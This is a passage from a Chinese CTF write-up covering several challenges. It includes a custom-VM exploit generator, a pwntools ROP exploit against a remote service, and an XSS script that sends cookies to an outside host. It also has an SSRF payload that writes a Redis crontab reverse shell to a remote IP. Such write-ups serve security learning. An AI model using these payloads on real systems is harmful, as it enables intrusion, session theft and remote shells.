return data
def add(op1, op2, op3):
imm_list = []
opcode = make_opcode(0xC, 3)
op1_parsed = make_operand(op1)
op2_parsed = make_operand(op2)
op3_parsed = make_operand(op3)
if op1_parsed[0] == 6:
imm_list.append(op1_parsed[1])
if op2_parsed[0] == 6:
imm_list.append(op2_parsed[1])
if op3_parsed[0] == 6:
imm_list.append(op3_parsed[1])
optype = make_optype(op1_parsed[0], op2_parsed[0])
optyp2 = make_optype(op3_parsed[0], op3_parsed[0])
data = ''
data += p8(opcode)
data += p8(optype)
data += p8(optyp2)
for imm in imm_list:
data += p32(imm)
return data
def sub(op1, op2, op3):
imm_list = []
opcode = make_opcode(0xb, 3)
op1_parsed = make_operand(op1)
op2_parsed = make_operand(op2)
op3_parsed = make_operand(op3)
if op1_parsed[0] == 6:
imm_list.append(op1_parsed[1])
if op2_parsed[0] == 6:
imm_list.append(op2_parsed[1])
if op3_parsed[0] == 6:
imm_list.append(op3_parsed[1])
optype = make_optype(op1_parsed[0], op2_parsed[0])
optyp2 = make_optype(op3_parsed[0], op3_parsed[0])
data = ''
data += p8(opcode)
data += p8(optype)
data += p8(optyp2)
for imm in imm_list:
data += p32(imm)
return data
def call(funcname):
opcode = make_opcode(6, len(funcname))
data = p8(opcode)
data += funcname
return data
def main():
dataseg_size = 0
header = 'hfex' + p32(dataseg_size)
header = header.ljust(8 + dataseg_size, '\x00')
free_hook_offset = 0x1B18B0
read_offset = 0xD41C0
system_offset = 0x3A940
environ_offset = 0x1B1DBC
binsh_offset = 0x0158E8B
stack_offset = 212
'''
free_hook_offset = 0x1AC8D8
read_offset = 0xDAF60
system_offset = 0x40310
environ_offset = 0x1ACE00
binsh_offset = 0x16084C
'''
# use sp for arbitary read, stack lower than libc, higher than binary
# but wtf ??? heap addr higher than libc on server???
code = ''
#code += move_imm('r0', 'r1')
# leak pie, -0x3078 = base, got = base + 0x3018
code += move_mem('r0', 'sp')
# set xxx
code += move_imm('sp', 'r1')
code += sub('sp', 'sp', '*0x68')
code += pop('r2')
code += move_imm('r0', '*1')
# get stack frame
code += sub('r2', 'r2', '*' + hex(read_offset))
# r2 = libc
code += move_mem('r1', 'r2')
#code += add('r1', 'r1', '*' + hex(system_offset))
code += add('r1', 'r1', '*' + hex(environ_offset))
code += move_mem('sp', 'r1')
code += pop('r0')
# get environ
code += sub('sp', 'r0', '*' + hex(stack_offset-0x10))
code += add('r1', 'r2', '*' + hex(binsh_offset))
code += push('r1')
# push arg
code += add('r1', 'r2', '*' + hex(system_offset))
code += push('r1')
code += push('r1')
code += push('r1')
final_gen = header + code
with open('gen.bin', 'wb') as f:
f.write(final_gen)
return
if __name__ == '__main__':
main()
7.Pwn-出题人失踪了
用 BROP，很厉害啊。。。思路是先爆破出__libc_csu_init 最后的 6 个 pop 的 gadget 的地址，可
以用一些字符的回显来知道没有 crash，然后爆破 got 表中 puts 的地址，之后就可以把整个
bin dump 出来，最后 rop 执行 system(“/bin/sh”)
from pwn import *
import time
io = remote('115.28.78.54', 13455)
io.recvuntil('please input you token: ')
token = '33f7f88e95f8ed17631ed655513e2ac6GHrQhlnc'
io.send(token)
io.recvuntil('Do you know password?\n')
pop_pop_pop_pop_pop_pop_ret = 0x4007ba
puts_got = 0x601018
call_gadget = pop_pop_pop_pop_pop_pop_ret - (0x400E6A - 0x400E50)
pop_rdi = pop_pop_pop_pop_pop_pop_ret + (0x400E72 - 0x400E6A + 1)
payload = 'A' * 72
payload += p64(0x4007ba) + p64(0) + p64(1) + p64(puts_got) + p64(1) * 2 + p64(puts_got)
payload += p64(call_gadget) + p64(1) * 7
payload += p64(0x40072d)
io.send(payload)
content = io.recv()
puts_addr = u64(content[:-1] + '\x00\x00')
log.info('puts_addr:%#x' % puts_addr)
offset_system = 0x45390
offset_str_bin_sh = 0x18c177
system_addr = puts_addr - (0x6f690 - offset_system)
bin_sh_addr = puts_addr - (0x6f690 - offset_str_bin_sh)
payload = 'A' * 72
payload += p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)
io.send(payload)
io.interactive()
Level4
1.Web-大图书馆的牧羊
审计代码发现 comm.php 存放的是对 cookie 加密解密的函数，伪造 admin 进行登录。发现
upload.php 可上传 zip 文件，只对文件类型校验，burp 绕过即可，上传 zip 文件，自解压拿到
shell
2.Reverse-flip
qt 前两层直接 patch 绕过了
一个关灯游戏，第二关的通关步骤作为 xorkey 异或一个 463 大小的数组，把每个输入的字
节分成高 4 位和低 4 位，从两边往中间校验，看处理结果是否得到九个 0xff，flag 的最后 5
个数字是防作弊用的，思路就是爆破得到 xorkey 为 6 - 4 - 1 - 8 - 2 - 1 - 0，再逐
位爆破得到 flag 为 hctf{L1ttl3_f1ip_Gam3_f0r_32169}
3.Web-secret area
拿到题目,发现还是 csp 的绕过,只是这次...
```
Content-Security-Policy:default-src
'self';
script-src
http://sguestbook.hctf.io/static/
'sha256-n+kMAVS5Xj7r/dvV9ZxAbEX6uEmK+uen+HZXbLhVsVA='
'sha256-2zDCsAh4JN1o1lpARla6ieQ5KBrjrGpn0OAjeJ1V9kg='
'sha256-SQQX1KpZM+ueZs+PyglurgqnV7jC8sJkUMsG9KkaFwQ='
'sha256-JXk13NkH4FW9/ArNuoVR9yRcBH7qGllqf1g5RnJKUVg='
'sha256-NL8WDWAX7GSifPUosXlt/TUI6H8JU0JlK7ACpDzRVUc='
'sha256-CCZL85Vslsr/bWQYD45FX+dc7bTfBxfNmJtlmZYFxH4='
'sha256-2Y8kG4IxBmLRnD13Ne2JV/V106nMhUqzbbVcOdxUH8I='
'sha256-euY7jS9jMj42KXiApLBMYPZwZ6o97F7vcN8HjBFLOTQ='
'sha256-V6Bq3u346wy1l0rOIp59A6RSX5gmAiSK40bp5JNrbnw=';
font-src
http://sguestbook.hctf.io/static/ fonts.gstatic.com; style-src 'self' 'unsafe-inline'; img-src
'self'
```
csp 很复杂,但是大部分都没用,开始没啥思路,后来发现存在一个 php 叫 redirect.php,文件位
于 static 目录下,正好是 script 标签可以访问的路径
![Alt text](./1480260720779.png)
所以可以上传一个头像去获取 session.然后构造双写绕过 script,访问 redirect.php,重定向到
头像那个地址,从而实现绕过 csp 的
最终 payload:
```
```
`http://sguestbook.hctf.io/upload/d35f156a60a5cf3423b28d79d4426832`内容
```
var coo = document.cookie;
location.href="http://xss.albertchang.cn/?coo="+coo;
```
4.Forensic
下载得到一个 docker image，需要寻找后门。攻击者利用 mysql 入侵，利用 opcache 留了
后门，但是服务器是 64 位的 php，所以 opcache 不能直接使用 github 上项目的工具分析，
本 来 打 算 修 改 工 具 。 后 发 现 .viminfo 文 件 ， 根 据
vim 历 史 发 现 被 修 改 的 文 件 是
class-wp.php.bin 直接 strings 分析，最后有一个 base64 编码的字符串，解密得到 flag。
5. Web-AT field1
标准的送分题目`link=http://xss.albertchang.cn/albert.php?albertchang=http://127.0.0.1`,
直接拿到 flag
6.Web-AT field2
根据多个 hint,首先扫到一个 README.md,解码 base64 发现存在 redis,扫一发内网,在
192.168.0.10 上发现 redis,之后参考 redis 内网未授权访问控制 crontab 写 shell,[参考文
献](https://security.tencent.com/index.php/blog/msg/106),根据这个构造 payload,当请求
为 503 的时候表示成功写入到 cron 中.
最终 payload:
```
link=http://xss.albertchang.cn/albert.php?albertchang=http://192.168.0.10%25250d%25250
a%252a3%25250d%25250a%2525243%25250d%25250aset%25250d%25250a%2525241%25250d%2525
0a1%25250d%25250a%25252462%25250d%25250a%25250a%252a%25252F1%252520%252a%252520%
252a%252520%252a%252520%252a%252520%25252Fbin%25252Fbash%252520-i%252520%25253E%2
52526%252520%25252Fdev%25252Ftcp%25252F45.32.42.203%25252F10010%2525200%25253E%2
525261%25250a%25250d%25250aconfig%252520set%252520dir%252520%25252Fvar%25252Fspool%
25252Fcron%25252F%25250d%25250aconfig%252520set%252520dbfilename%252520root%25250d%2
5250asave%25250d%25250a%253A6379%252f
```
在自己的 vps 上监听 10010,得到 shell
Level5
1.Web-魔法禁书目录
跟大图书馆代码应该类似，通过分析大图书馆的代码，发现是 aes，采用 cbc 字节翻转攻击
得到 cookie，然后是 xxe 攻击，上传构造好的文件即可拿到 flag。不过貌似有过滤，直接读
file:///var/www/html/flag.php 不行，可以利用 base64 进行绕过
题目：